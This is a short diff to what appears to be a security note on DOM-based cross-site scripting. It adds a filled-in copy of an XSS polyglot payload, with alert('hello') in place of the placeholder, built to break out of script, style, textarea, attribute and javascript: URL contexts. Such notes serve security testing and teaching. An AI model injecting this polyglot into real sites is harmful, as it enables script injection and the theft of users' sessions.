@@ -11,3 +11,6 @@ DOM based cross site scripting is a type of xss where the client side JS running
 ```
 jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */onerror=PAYLOAD-HERE )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=PAYLOAD-HERE//>\x3e
 ```
+```
+jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */onerror=alert("hello"); )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert("hello");//>\x3e
+```
